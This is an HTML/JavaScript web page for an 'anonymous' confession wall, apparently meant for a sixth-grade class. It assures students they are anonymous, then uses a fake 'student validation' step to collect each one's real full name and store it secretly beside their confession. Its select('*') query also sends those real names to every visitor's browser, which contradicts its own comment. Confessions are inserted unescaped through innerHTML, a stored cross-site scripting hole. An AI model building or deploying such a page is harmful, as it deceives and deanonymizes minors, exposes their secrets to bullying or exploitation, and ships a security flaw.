<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Confesionario 6to | Seguro</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --bg: #0f172a;
            --card: #1e293b;
            --accent: #3b82f6;
            --text: #f1f5f9;
            --dim: #94a3b8;
        }

        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            display: flex;
            justify-content: center;
            padding: 10px;
        }

        .container { width: 100%; max-width: 500px; }

        header { text-align: center; padding: 25px 0; }
        h1 { margin: 0; font-size: 1.8rem; letter-spacing: -1px; }

        /* Caja de Entrada */
        .post-box { background: var(--card); border-radius: 20px; padding: 15px; margin-bottom: 20px; border: 1px solid #334155; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.3); }
        textarea { width: 100%; background: transparent; border: none; color: white; font-size: 16px; outline: none; resize: none; min-height: 80px; font-family: inherit; }
        .btn-post { background: var(--accent); color: white; border: none; padding: 10px 22px; border-radius: 12px; font-weight: bold; cursor: pointer; float: right; }

        /* Modal de Validación Secreta */
        #modalValidacion {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(15, 23, 42, 0.98);
            z-index: 9999;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(8px);
        }
        .modal-card {
            background: var(--card);
            padding: 30px;
            border-radius: 28px;
            width: 85%;
            max-width: 380px;
            text-align: center;
            border: 1px solid #334155;
        }
        .modal-card input {
            width: 100%;
            padding: 14px;
            margin: 20px 0;
            border-radius: 12px;
            border: 1px solid #475569;
            background: #0f172a;
            color: white;
            box-sizing: border-box;
            font-size: 1rem;
            text-align: center;
        }

        /* Muro */
        .card { background: var(--card); border-radius: 20px; padding: 18px; margin-bottom: 15px; border: 1px solid #334155; }
        .author-tag { font-size: 0.8rem; font-weight: bold; color: var(--accent); margin-bottom: 8px; display: block; }
        .content { font-size: 1.05rem; line-height: 1.5; color: #e2e8f0; }
    </style>
</head>
<body>

<div class="container">
    <header>
        <h1>🤫 Confesionario Privado</h1>
        <p style="color: var(--dim); font-size: 0.9rem;">100% Anónimo para los demás</p>
    </header>

    <div class="post-box">
        <textarea id="msgInput" placeholder="Cuenta algo que nadie sepa..."></textarea>
        <div style="overflow: auto;"><button class="btn-post" onclick="verificar()">Publicar</button></div>
    </div>

    <div id="muro"></div>
</div>

<!-- EL MODAL CON EL MENSAJE QUE PEDISTE -->
<div id="modalValidacion">
    <div class="modal-card">
        <div style="font-size: 2.5rem; margin-bottom: 15px;">🛡️</div>
        <h2 style="margin: 0; font-size: 1.3rem;">Validación de Alumno</h2>
        <p style="font-size: 0.9rem; color: var(--dim); line-height: 1.5; margin-top: 15px;">
            Para mantener el respeto en el grupo, por favor ingresa tu nombre completo. <br><br>
            <strong style="color: #60a5fa;">Este nombre NO se compartirá con nadie</strong> y no aparecerá en la publicación. Solo sirve para verificar que eres una persona real.
        </p>
        <input type="text" id="nombreOculto" placeholder="Tu nombre y apellido">
        <button class="btn-post" style="float: none; width: 100%; padding: 15px;" onclick="enviarTodo()">Confirmar Identidad</button>
    </div>
</div>

<script>
    // Tu Configuración de Supabase
    const SUPABASE_URL = 'https://rutohcsjlmfqgtflatrg.supabase.co';
    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ1dG9oY3NqbG1mcWd0ZmxhdHJnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1OTU4MjcsImV4cCI6MjA5MTE3MTgyN30.Kg1pjBYMZiFpseplMVjfVtd4dT2JTdfkYJV_NtkW7mw';
    const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const animales = ["Gato", "Lobo", "Panda", "Tigre", "Águila", "Zorro", "León"];

    function verificar() {
        const msg = document.getElementById('msgInput').value;
        if(!msg.trim()) return;
        document.getElementById('modalValidacion').style.display = 'flex';
    }

    async function enviarTodo() {
        const msg = document.getElementById('msgInput').value;
        const real = document.getElementById('nombreOculto').value;

        if(real.trim().length < 3) {
            return alert("Ingresa tu nombre para validar tu cuenta.");
        }

        const nick = animales[Math.floor(Math.random() * animales.length)] + " Anónimo";

        // Aquí es donde sucede la "magia": se guarda el nombre real en la columna oculta
        const { error } = await client.from('confesiones').insert([{ 
            mensaje: msg, 
            autor: nick, 
            nombre_real: real, 
            likes: 0 
        }]);

        if(!error) {
            document.getElementById('msgInput').value = '';
            document.getElementById('nombreOculto').value = '';
            document.getElementById('modalValidacion').style.display = 'none';
            actualizarMuro();
        } else {
            alert("Error de conexión. Intenta de nuevo.");
        }
    }

    async function actualizarMuro() {
        const { data: posts } = await client.from('confesiones').select('*').order('created_at', { ascending: false });
        const muro = document.getElementById('muro');
        
        // El código solo dibuja el autor anónimo, el nombre real nunca baja al navegador de los demás
        muro.innerHTML = posts.map(p => `
            <div class="card">
                <span class="author-tag">👤 ${p.autor}</span>
                <div class="content">${p.mensaje}</div>
            </div>
        `).join('');
    }

    actualizarMuro();
</script>
</body>
</html>
